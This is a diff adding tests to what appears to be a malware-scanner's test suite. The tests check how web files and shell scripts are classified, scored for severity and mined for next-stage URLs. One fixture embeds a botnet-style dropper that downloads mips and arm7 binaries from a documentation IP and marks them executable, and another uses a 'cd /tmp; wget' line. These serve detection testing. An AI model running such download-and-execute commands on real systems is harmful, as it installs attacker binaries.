@@ -122,3 +122,71 @@ def test_regex_pathologies(rules: CompiledRules) -> None:
     timed(b"#!/bin/sh\n" + b"echo " + b"A" * 500_000 + b"=" * 3 + b" | base64 -d\n", rules)
     timed(b"1.1.1.1." * 100_000, rules)
     timed(b"a.b.c.d." * 100_000, rules)
+
+
+def test_web_pages_carry_no_next_stage(rules: CompiledRules) -> None:
+    page = (
+        b"<!doctype html><html><head><title>t</title>"
+        b'<script src="https://cdn.example.test/a.js"></script></head>'
+        b'<body><a href="https://www.example.test/x">x</a>'
+        b'<img src="http://198.51.100.7/logo.png"></body></html>'
+    )
+    result = timed(page, rules)
+    assert result.file.kind == "html"
+    assert result.severity == "info"
+    assert result.family is None
+    assert result.iocs == []
+    assert result.deobfuscated is None
+    assert result.strings  # strings are still extracted
+
+
+def test_huge_web_files_stay_within_limits(rules: CompiledRules) -> None:
+    html = b"<html><body>" + b"<div class='a'>x</div>" * 800_000
+    assert timed(html, rules).file.kind == "html"
+    js = b'"use strict";var a=function(){return 1};' * 400_000
+    assert timed(js, rules).file.kind == "javascript"
+    css = b"a{color:red}" * 1_000_000
+    assert timed(css, rules).file.kind == "css"
+    pathological = b"{" + b"a:" * 2000 + b"}" + b"<" * 4000
+    timed(pathological, rules)
+    timed(b"x" * 150 + b"{" + b"y" * 150 + b"{" * 3000, rules)
+
+
+def test_every_web_kind_has_no_links_and_the_lowest_severity(rules: CompiledRules) -> None:
+    bodies = {
+        "svg": b'<svg xmlns="http://www.w3.org/2000/svg"><a href="https://example.test/x"/></svg>',
+        "xml": b'<?xml version="1.0"?><rss><link>https://example.test/feed</link></rss>',
+        "css": b"body{background:url(https://example.test/bg.png)}a{color:red}p{margin:0}",
+        "javascript": (
+            b'"use strict";var u="https://example.test/api";const f=function(){return u};'
+            b"window.f=f;"
+        ),
+        "json": b'{"update": "https://example.test/app.json", "n": 1}',
+    }
+    for kind, body in bodies.items():
+        result = timed(body, rules)
+        assert (result.file.kind, result.severity, result.iocs) == (kind, "info", [])
+
+
+def test_a_rule_hit_still_raises_the_severity_of_web_content(rules: CompiledRules) -> None:
+    page = (
+        b"<html><body><pre>wget http://192.0.2.1/bins/mips\nwget http://192.0.2.1/bins/arm7\n"
+        b"chmod +x mips arm7\n</pre></body></html>"
+    )
+    result = timed(page, rules)
+    assert result.file.kind == "html"
+    assert result.severity == "severe"
+    assert result.iocs == []
+
+
+def test_the_same_links_in_a_script_are_followed(rules: CompiledRules) -> None:
+    urls = b"https://www.example.test/x http://198.51.100.7/logo.png"
+    script = timed(b"#!/bin/sh\nwget " + urls + b"\n", rules)
+    assert script.file.kind == "script"
+    assert [i.kind for i in script.iocs] == ["next_url", "next_url"]
+    bare = timed(b"cd /tmp; wget " + urls, rules)  # no shebang
+    assert bare.file.kind == "script"
+    assert len(bare.iocs) == 2
+    text = timed(b"mirror list: " + urls, rules)  # plain text is still read for links
+    assert text.file.kind == "text"
+    assert len(text.iocs) == 2
